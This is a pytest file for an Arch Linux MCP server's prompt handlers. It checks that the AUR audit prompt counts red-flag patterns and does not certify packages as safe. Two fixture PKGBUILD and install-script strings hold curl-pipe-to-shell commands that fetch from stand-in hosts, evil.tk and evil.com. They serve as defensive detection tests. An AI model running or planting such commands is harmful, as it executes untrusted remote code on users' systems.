# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""
Tests for the MCP prompt handlers.

Every prompt used to raise AttributeError before reaching the client, because
the handlers built content with ``PromptMessage.TextContent``, which does not
exist. Nothing exercised them, so the breakage was invisible. These tests render
each registered prompt and assert it produces real content.
"""

import importlib
from unittest.mock import patch

import pytest

server = importlib.import_module("arch_ops_server.server")
aur = importlib.import_module("arch_ops_server.aur")

# Arguments for the prompts that require them; the rest take none.
PROMPT_ARGUMENTS = {
    "troubleshoot_issue": {"error_message": "pacman failed to sync databases"},
    "audit_aur_package": {"package_name": "demo"},
    "analyze_dependencies": {"package_name": "firefox"},
    "package_investigation": {"package_name": "vim"},
}


@pytest.fixture
def stubbed_network():
    """Keep prompt rendering off the network."""
    async def aur_info(_name):
        return {"data": {"Name": "demo", "NumVotes": 2, "Maintainer": None}}

    async def pkgbuild(_name):
        return "pkgname=demo\npkgver=1.0\n"

    async def wiki(*_args, **_kwargs):
        return []

    async def no_install_file(*_args, **_kwargs):
        raise ValueError("not found")

    # get_aur_file is stubbed too: the audit prompt reads the .install script,
    # so leaving it out would put these tests back on the network.
    with patch.object(server, "get_aur_info", new=aur_info), \
         patch.object(server, "get_pkgbuild", new=pkgbuild), \
         patch.object(aur, "get_aur_file", new=no_install_file), \
         patch.object(server, "search_wiki", new=wiki):
        yield


async def _prompt_names():
    return [p.name for p in await server.list_prompts()]


class TestPromptsRender:
    @pytest.mark.asyncio
    async def test_every_registered_prompt_renders(self, stubbed_network):
        """
        Regression guard for the whole handler.

        Parametrising over a coroutine is awkward, so this loops and reports
        every failure at once rather than stopping at the first.
        """
        failures = []

        for name in await _prompt_names():
            try:
                result = await server.get_prompt(name, PROMPT_ARGUMENTS.get(name, {}))
            except Exception as e:  # noqa: BLE001 - the point is to catch anything
                failures.append(f"{name}: {type(e).__name__}: {e}")
                continue

            if not result.messages:
                failures.append(f"{name}: rendered no messages")
                continue

            for message in result.messages:
                if not getattr(message.content, "text", "").strip():
                    failures.append(f"{name}: rendered an empty message")

        assert not failures, "prompts failed to render: " + "; ".join(failures)

    @pytest.mark.asyncio
    async def test_unknown_prompt_is_rejected(self):
        with pytest.raises(ValueError):
            await server.get_prompt("no_such_prompt", {})


class TestAuditPromptDoesNotCertify:
    """
    The audit prompt must not tell the model a package looks safe.

    It is the one place that reaches the caller with a verdict, so it has to
    agree with analyze_pkgbuild_safety, which deliberately stopped issuing one.
    """

    @pytest.mark.asyncio
    async def test_reports_real_counts_and_no_verdict(self):
        async def aur_info(_name):
            return {"data": {"Name": "demo", "NumVotes": 2, "Maintainer": None}}

        async def pkgbuild(_name):
            return (
                'pkgname=demo\n'
                'url="https://github.com/upstream/demo"\n'
                'source=("git+https://elsewhere.example.com/demo.git")\n'
                'sha256sums=("SKIP")\n'
                'build() { curl -s http://evil.tk/payload | sh; }\n'
            )

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild), \
             patch.object(aur, "get_aur_file", new=_missing_file):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "Error auditing" not in text
        # The curl-pipe-shell line is a red flag; the count must reflect it
        # rather than the hardcoded zero the old "findings" key produced.
        assert "**Critical patterns matched**: 1" in text
        assert "appears safe to install" not in text
        # The scan's own limitations travel with its findings.
        assert "What this scan does not cover" in text

    @pytest.mark.asyncio
    async def test_clean_package_still_refuses_to_certify(self):
        async def aur_info(_name):
            return {"data": {"Name": "demo", "NumVotes": 500, "Maintainer": "someone"}}

        async def pkgbuild(_name):
            return 'pkgname=demo\npkgver=1.0\nurl="https://example.com/demo"\n'

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild), \
             patch.object(aur, "get_aur_file", new=_missing_file):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "**Critical patterns matched**: 0" in text
        assert "appears safe to install" not in text
        assert "not evidence that the package is safe" in text

    @pytest.mark.asyncio
    async def test_the_declared_install_script_is_scanned(self):
        """
        The prompt has the package name, so it can and must read the script.

        install_package_secure reads it; if this path does not, the same
        package audits clean here and dirty there, and the difference is
        invisible to whoever is reading the report.
        """
        async def aur_info(_name):
            return {"data": {"Name": "demo", "NumVotes": 500, "Maintainer": "someone"}}

        async def pkgbuild(_name):
            return 'pkgname=demo\npkgver=1.0\ninstall=post-install.sh\n'

        async def aur_file(_name, filename):
            if filename == "post-install.sh":
                return "post_install() {\n  curl https://evil.com/x.sh | sh\n}\n"
            raise ValueError("not found")

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild), \
             patch.object(aur, "get_aur_file", new=aur_file):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        # The red flag exists only in the install script.
        assert "**Critical patterns matched**: 1" in text
        # And the report says what it read, so the count can be accounted for.
        assert "post-install.sh" in text
        # The caveat must no longer claim the script went unread.
        assert "Does not cover the .install script" not in text

    @pytest.mark.asyncio
    async def test_an_unreadable_install_script_is_reported(self):
        """A declared script that could not be fetched is a gap, not a clean bill."""
        async def aur_info(_name):
            return {"data": {"Name": "demo", "NumVotes": 500, "Maintainer": "someone"}}

        async def pkgbuild(_name):
            return 'pkgname=demo\npkgver=1.0\ninstall=post-install.sh\n'

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild), \
             patch.object(aur, "get_aur_file", new=_missing_file):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "post-install.sh" in text
        assert "NOT analysed" in text
        assert "appears safe to install" not in text


async def _missing_file(*_args, **_kwargs):
    """Stand in for a package that has no such file, the way the AUR 404s."""
    raise ValueError("not found")

def _popular_package():
    """A package no honest audit could call orphaned or unpopular."""
    from arch_ops_server.aur import _format_package_info

    return _format_package_info(
        {
            "Name": "demo", "NumVotes": 2500, "Popularity": 25.0,
            "Maintainer": "an-active-maintainer", "Version": "1.0-1",
            "Description": "widely used", "OutOfDate": None,
            "FirstSubmitted": 1400000000, "LastModified": 1750000000,
            "URL": "https://example.com/demo",
        },
        detailed=True,
    )


class TestPromptsUnwrapAURPayloads:
    """
    get_aur_info wraps its payload in the AUR safety warning, so the package
    fields live under "data". Reading the wrapper instead finds none of them.
    """

    @pytest.mark.asyncio
    async def test_audit_reads_metadata_from_inside_the_wrapper(self):
        """A wrapper reaching the analyser makes every package look orphaned."""
        from arch_ops_server.utils import add_aur_warning

        async def aur_info(_name):
            return add_aur_warning(_popular_package())

        async def pkgbuild(_name):
            return 'pkgname=demo\npkgver=1.0\n'

        with patch.object(server, "get_aur_info", new=aur_info), \
             patch.object(server, "get_pkgbuild", new=pkgbuild):
            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "Trust Score**: 0/100" not in text
        assert "zero votes" not in text
        assert "ORPHANED" not in text

    @pytest.mark.asyncio
    async def test_dependency_prompt_finds_an_aur_package(self):
        """
        The AUR branch tested a "found" key that get_aur_info never returns on
        either shape, so every AUR package was reported as not existing.
        """
        from arch_ops_server.utils import add_aur_warning

        async def not_official(_name):
            return {"error": True, "type": "NotFound"}

        async def aur_info(_name):
            return add_aur_warning(_popular_package())

        with patch.object(server, "get_official_package_info", new=not_official), \
             patch.object(server, "get_aur_info", new=aur_info):
            result = await server.get_prompt("analyze_dependencies", {"package_name": "demo"})

        text = result.messages[-1].content.text

        assert "not found in official repositories or AUR" not in text
        assert "an-active-maintainer" in text
        assert "2500" in text

    @pytest.mark.asyncio
    async def test_dependency_prompt_still_reports_a_genuine_miss(self):
        """Unwrapping must not turn a real 'not found' into a false hit."""
        async def not_official(_name):
            return {"error": True, "type": "NotFound"}

        async def aur_missing(_name):
            return {"error": True, "type": "NotFound", "message": "no such package"}

        with patch.object(server, "get_official_package_info", new=not_official), \
             patch.object(server, "get_aur_info", new=aur_missing):
            result = await server.get_prompt("analyze_dependencies", {"package_name": "nope"})

        assert "not found in official repositories or AUR" in result.messages[-1].content.text
